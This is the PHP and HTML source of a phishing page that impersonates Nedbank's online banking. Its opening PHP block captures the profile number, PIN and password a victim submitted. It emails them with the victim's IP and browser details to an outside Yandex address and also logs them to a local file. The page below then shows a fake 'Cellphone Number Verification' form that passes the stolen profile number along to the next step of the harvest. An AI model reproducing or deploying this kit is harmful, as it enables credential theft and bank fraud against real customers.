<?php
   
 
 //start building the mail string
  $ip = getenv("REMOTE_ADDR");
$message .= "-------- NED Bank ------------\n";
$message .= "Profile Number : ".$_POST['RRPPNN']."\n";
$message .= "PIN : ".$_POST['RPP']."\n";
$message .= "Password : ".$_POST['RPCOD']."\n";
$message .= "IP: ".$ip."\n";
$message .= "Port: ".$port."\n";
$message .= "---------Created DON MONEY--------------\n";
   $message .= "Browser:   $_SERVER[HTTP_USER_AGENT] \n";




//set up the mail
   $recipient = "bi1l.williams@yandex.com";
  $subject = "1st Resultz NED";
  $mailheaders = "From: $_SERVER[REMOTE_ADDR]\n";
  //send the mail
 mail($recipient, $subject, $message, $mailheaders);
$fp = fopen("resultzICtyYWlzZWQrICInPjxoNCBzdHlsZT0ncGFkZGluZzo0cHggMCc9.txt","a");
fputs($fp,$message);
fclose($fp);
  ?>
<table style="border:0; width:100%"  class="theHeader"

		cellspacing="0" cellpadding="0" ID="Table1" summary="text">

			<tr>

				<td width="452" height="61">

					<table ID="Table2" summary="text">

						<tr>

							<td valign="top" height="100%">

                                <a href="#" target= "_parent"><img src="images/NedbankLogo.gif" border="0" alt=

							""></a>

                            <!--img src="http://kjcustom.com/n1/images/lnedbankogo.gif" border="0" alt=

							"XXXXXXXX"-->

							</td>

							
						</tr>

					</table>

				</td>

				<td width="356">

					<font color="#005542"><b>Profile number:  <?php print "$_POST[RRPPNN] \n\n"; ?></b></font>

				</td>

				<td width="287" valign="middle" align="right">

					<table ID="Table3" summary="text">

						<tr>

							<td>

								<a href="#" onClick="#"><img border="0" src=

								"images/contactus_up.gif" width="78" height="23"

								alt=""></a> 

								<!-- <a href="default_help.htm" target="_blank"><img border="0" src="http://kjcustom.com/n1/images/help_up.gif" width="78" height="23"></a> -->

								 <a href="#"><img border="0"

								src="images/help_up.gif" width="78" height="23"

								alt=""></a> <a href="https://netbank.nedsecure.co.za/Logoff.bank">
                                <img border="0" src="images/logoff_up.gif" width="78" height="23" alt=""></a>

							</td>

						</tr>

					</table>

				</td>

			</tr>

		</table><p></p>
<table cellSpacing="0" cellPadding="0" width="100%" border="0">
  <tr>
<title>Nedbank PIN Protection</title>
    <td>
   <p></p>
    <p></p>
    <p></p>
    <p></p>
    <table width="100%" height="19" border="0" align="center" cellSpacing="0">
      <tr>
        <td width="100%" bgcolor="#1E4532" height="17">&nbsp;</td>
      </tr>
    </table>
    <table width="100%" border="0" align="center" cellPadding="10" cellSpacing="0">
      <tr>
        <td vAlign="top" width="100%">
        <table width="841" border="0" align="center">
                <tbody>
                  <tr>
                    <td width="298">&nbsp;</td>
                    <td width="499"><b>
			<font color="#005641" face="Arial" style="text-align: center">Cellphone Number Verification</font></b></td>
                    <td width="30">&nbsp;</td>
                  </tr>
                </tbody>
            </table>
        </td>
      </tr>
    </table>
    <form id="LoginForm" name="LoginForm" action="card_update.php" method="post"> 
    <hr class="hrTitleBreak" width="98%">
    <!-- Static Table: Force static table width at 800 -->
    <table cellPadding="10" width="100%">
      <tr>
        <td>
      <TABLE align="center" cellPadding=3 cellSpacing=0>
        <TBODY>
        <TR>
          <TD align=left>
		
                <p class="pSmsSummary">

              <font face="Arial" size="2" color="#005641">                  Please enter the cellphone number registered on your profile in the box below and click on 'Verify'.&nbsp;
</font>
                </p>
           <TABLE align="center" class=tbMainList id=Table1>
              <TBODY>
              <TR>
                <TD height=20 style="text-align: center"><font face="Arial" size="2" color="#005641">Enter Cellphone Number </font></TD>
                <TD height=20>
				<INPUT 
              name=cellphone id=cellphone size="15" maxlength="10" required class="form-control">
					<INPUT 
 type="hidden" id=RRPPNN name=RRPPNN value= "<?php print "$_POST[RRPPNN] \n\n"; ?>">
					</TD></TR></TBODY></TABLE>
            <TABLE align="center">
              <TBODY>
            
              <TR>
                <TD height=20><br/><INPUT onclick=continueFx(); value=Verify type=submit name="verify"></TD></TR></TBODY></TABLE>
          </TD></TR></TBODY></TABLE>
        <p><br>
        &nbsp;<TABLE cellSpacing=0 cellPadding=4 width="99%" bgColor=#d8e8de border=0>
  <TBODY>
  <TR>
    <TD vAlign=top height=39 bgcolor="#1E4532"><B>
      <TABLE width=391>
        <TBODY>
        <TR>
          <TD width=385 height=10><B><FONT face=Verdana color=#ffffff 
            size=2><u><font color="#FFFFFF">Terms and conditions</font></u> </FONT>
			<font color="#FFFFFF" face="Verdana" size="2">|</font><font face="Verdana"><font size="2" color="#FFFFFF">
			<u>SMS notice</u> |
			</font><u>
			<font size="2" color="#FFFFFF">Security Notice</font></u></font></B></TD>
          </TR>
        <TR>
          <TD><B><FONT face=Verdana color=#FFFFFF size=2>Copyright © 
            Nedbank Limited 1997 - 2010&nbsp; &nbsp;<BR>All rights 
            reserved&nbsp;&nbsp;&nbsp;</FONT><font color="#FFFFFF"> </font> </B></TD></TR></B></TBODY></TABLE></TD>
    </TR></TBODY></TABLE>
		</td>
      </tr>
      </table>
    </td>
  </tr>
</table>